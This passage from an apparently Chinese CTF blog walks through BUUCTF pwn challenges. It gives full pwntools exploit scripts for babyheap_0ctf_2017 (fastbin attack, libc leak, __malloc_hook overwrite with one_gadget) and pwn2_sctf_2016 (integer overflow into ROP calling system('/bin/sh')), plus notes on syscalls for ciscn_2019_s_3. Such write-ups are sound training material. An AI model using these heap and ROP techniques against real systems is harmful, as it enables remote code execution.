0x557ac06f30c0:	0x0000000000000000	0x0000000000000000
0x557ac06f30d0:	0x0000000000000000	0x0000000000000000
0x557ac06f30e0:	0x0000000000000000	0x0000000000020f21
0x557ac06f30f0:	0x0000000000000000	0x0000000000000000</code></pre><p>接下来要malloc回chunk4，但是malloc fastbin有检查，chunksize必须和fastbin_index匹配。</p>
<p>所以覆盖chunk4的size为fastbin大小</p>
<div class="highlight" id="id-29"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span><span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c4b78</span></span></span></code></pre></div><blockquote>
<p>​		unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 ，所以得到这个fd的值，然后减去0x58再减去main_arena相对于libc的固定偏移，即得到libc的基地址。所以我们需要把 chunk 改成大于 fastbin 的大小，这样 free 后能进入 unsortbin 让我们能够泄露 libc 基址。
  我们的目标是覆盖 __malloc_hook 函数，这样我们调用 malloc 时就相当于调用我们写入的内容</p>
<p>​		<strong>malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写</strong> malloc_hook 来 getshell。</p>
</blockquote>
<pre tabindex="0"><code>pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x400x7f12e66c5ae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x00000000000000000x7f12e66c5af0 &lt;_IO_wide_data_0+304&gt;:	0x00007f12e66c4260	0x00000000000000000x7f12e66c5b00 &lt;__memalign_hook&gt;:	0x00007f12e6386ea0	0x00007f12e6386a700x7f12e66c5b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x00000000000000000x7f12e66c5b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000557ac06f30400x7f12e66c5b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x00000000000000000x7f12e66c5b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x00000000000000000x7f12e66c5b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x00000000000000000x7f12e66c5b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x00000000000000000x7f12e66c5b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000557ac06f30e00x7f12e66c5b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f12e66c5b780x7f12e66c5b90 &lt;main_arena+112&gt;:	0x00007f12e66c5b78	0x00007f12e66c5b880x7f12e66c5ba0 &lt;main_arena+128&gt;:	0x00007f12e66c5b88	0x00007f12e66c5b980x7f12e66c5bb0 &lt;main_arena+144&gt;:	0x00007f12e66c5b98	0x00007f12e66c5ba80x7f12e66c5bc0 &lt;main_arena+160&gt;:	0x00007f12e66c5ba8	0x00007f12e66c5bb80x7f12e66c5bd0 &lt;main_arena+176&gt;:	0x00007f12e66c5bb8	0x00007f12e66c5bc8</code></pre><p>同样的，这里我们也要绕过 malloc 的安全检查，chunksize 必须与 fastbin_index 相对应，初看 __malloc_hook 附近没有合适的 chunksize，这里需要巧妙的偏移一下。</p>
<pre tabindex="0"><code>pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x40+0xd
0x7f12e66c5aed &lt;_IO_wide_data_0+301&gt;:	0x12e66c4260000000	0x000000000000007f &lt;=fake chunk
0x7f12e66c5afd:	0x12e6386ea0000000	0x12e6386a7000007f
0x7f12e66c5b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000
0x7f12e66c5b1d:	0x0000000000000000	0x7ac06f3040000000
0x7f12e66c5b2d &lt;main_arena+13&gt;:	0x0000000000000055	0x0000000000000000
0x7f12e66c5b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000
0x7f12e66c5b4d &lt;main_arena+45&gt;:	0x0000000000000000	0x0000000000000000
0x7f12e66c5b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000
0x7f12e66c5b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x7ac06f30e0000000
0x7f12e66c5b7d &lt;main_arena+93&gt;:	0x0000000000000055	0x12e66c5b78000000
0x7f12e66c5b8d &lt;main_arena+109&gt;:	0x12e66c5b7800007f	0x12e66c5b8800007f
0x7f12e66c5b9d &lt;main_arena+125&gt;:	0x12e66c5b8800007f	0x12e66c5b9800007f
0x7f12e66c5bad &lt;main_arena+141&gt;:	0x12e66c5b9800007f	0x12e66c5ba800007f
0x7f12e66c5bbd &lt;main_arena+157&gt;:	0x12e66c5ba800007f	0x12e66c5bb800007f
0x7f12e66c5bcd &lt;main_arena+173&gt;:	0x12e66c5bb800007f	0x12e66c5bc800007f
0x7f12e66c5bdd &lt;main_arena+189&gt;:	0x12e66c5bc800007f	0x12e66c5bd800007f</code></pre><p>在0x7f12e66c5aed，这样就可以构造出一个index为5的fastbin，这样就可以改写__malloc_hook了。</p>
<div class="highlight" id="id-32"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x3c4aed</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></span></span></code></pre></div><p> 首先把 chunk 4 malloc 回来，这次 malloc 的大小在 fastbin 之内，然后把 chunk 4 的内容改为我们下一个要构造块的地址（chunk 4 已经被 free 掉，所以无法用 fill(4) 写入，由于我们刚刚把 chunk 2 的 fd 指针改为 chunk 4 的地址，所以第一次 malloc(0x10) 的时候是分配的原来 chunk 2 的块给 index 1，第二次 malloc(0x10) 的时候就会分配 chunk 4 的块给 index 2，也就是说 index 2 与 index 4 的内容都是 chunk 4）</p>
<p>这里介绍一个神奇的工具 one gadget，只用一个 gadget 地址就可以成功调用 execve(&quot;/bin/sh&quot;)。</p>
<pre tabindex="0"><code>gwt@ubuntu:~/Desktop$ one_gadget libc-x64-2.23.so 
[OneGadget] 
Checking for new versions of OneGadget            
To disable this functionality, do            
$ echo never &gt; /home/gwt/.cache/one_gadget/update[OneGadget] 
A newer version of OneGadget is available (1.6.2 --&gt; 1.7.4).            
Update with: $ gem update one_gadget &amp;&amp; gem cleanup one_gadget0x45216	
execve(&#34;/bin/sh&#34;, rsp+0x30, environ)constraints:  rax == NULL0x4526a	
execve(&#34;/bin/sh&#34;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4	
execve(&#34;/bin/sh&#34;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147	
execve(&#34;/bin/sh&#34;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</code></pre><p>在 __malloc_hook 地址处写入 one_gadget ，这样再次 allocate 就可以调用 one_gadget 拿 shell</p>
<p>EXP:</p>
<div class="highlight" id="id-34"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#39;./babyheap_0ctf_2017&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node3.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">28982</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc-x64-2.23.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Command: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span><span class="c1">#allocate</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Size: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fill</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Command: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Index: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Size: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Content: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Command: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;3&#34;</span><span class="p">)</span><span class="c1">#free</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Index: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Command: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Index: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Content: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
</span></span><span class="line"><span class="cl"><span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span> <span class="o">-</span> <span class="mi">35</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4526a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x17pwn2_sctf_2016" class="heading-element">
  <a href="#0x17pwn2_sctf_2016" class="heading-mark"></a>0x17.pwn2_sctf_2016</h3><p>get_n函数的第二个参数是unsigned int，可以整数溢出。</p>
<p>接收了两次you said，第一次是程序本身，第二次是自己的format。</p>
<div class="highlight" id="id-35"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node3.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">25915</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./pwn2_sctf_2016&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn2_sctf_2016&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.23.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x0804852F</span>
</span></span><span class="line"><span class="cl"><span class="n">fmt_addr</span> <span class="o">=</span> <span class="mh">0x080486F8</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">fmt_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;You said: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;You said: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x18ciscn_2019_s_3" class="heading-element">
  <a href="#0x18ciscn_2019_s_3" class="heading-mark"></a>0x18.ciscn_2019_s_3</h3><p>　　32位与64位 系统调用的区别：</p>
<blockquote>
<ol>
<li>
<p>传参方式不同</p>
</li>
<li>
<p>系统调用号 不同</p>
</li>
<li>
<p>调用方式 不同</p>
</li>
</ol>
</blockquote>
<p>　　32位：</p>
<pre tabindex="0"><code>传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器

调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4

调用方式: 使用 int 80h 中断进行系统调用</code></pre><p>　　64位：</p>
<pre tabindex="0"><code>传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器

调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1

stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15

调用方式: 使用 syscall 进行系统调用</code></pre><p>调用：$rax==59，$rdi==“/bin/sh”，$rsi==0，$rdx==0</p>
<p>首先往栈上写0x400，然后从栈上读0x30</p>
<p>经过调试发现输入后返回的是写入栈上的位置。</p>
<p><img loading="lazy" src="/posts/buu-pwn-0x10-0x1f/image-20210511160829045.png" alt="image-20210511160829045" srcset="/posts/buu-pwn-0x10-0x1f/image-20210511160829045.png?size=small, /posts/buu-pwn-0x10-0x1f/image-20210511160829045.png?size=medium 1.5x, /posts/buu-pwn-0x10-0x1f/image-20210511160829045.png?size=large 2x" data-title="image-20210511160829045" style="--width: 1200px;--aspect-ratio: 1200 / 784;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>将0x00007ffe7d621e58减去0x00007ffe7d621d40得到0x118（固定）</p>
<p>所以经过recv的地址减去0x118就是写入/bin/sh的地址</p>
<p>有个gadgets函数：</p>
<p><img loading="lazy" src="/posts/buu-pwn-0x10-0x1f/image-20210511161319133.png" alt="image-20210511161319133" srcset="/posts/buu-pwn-0x10-0x1f/image-20210511161319133.png?size=small, /posts/buu-pwn-0x10-0x1f/image-20210511161319133.png?size=medium 1.5x, /posts/buu-pwn-0x10-0x1f/image-20210511161319133.png?size=large 2x" data-title="image-20210511161319133" style="--width: 547px;--aspect-ratio: 547 / 380;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>其中的0x3B就是59，系统调用，</p>
<blockquote>
<p>hex(0x00007ffe7d621e58 - 0x7ffe7d621d40)
&lsquo;0x118&rsquo;</p>
</blockquote>
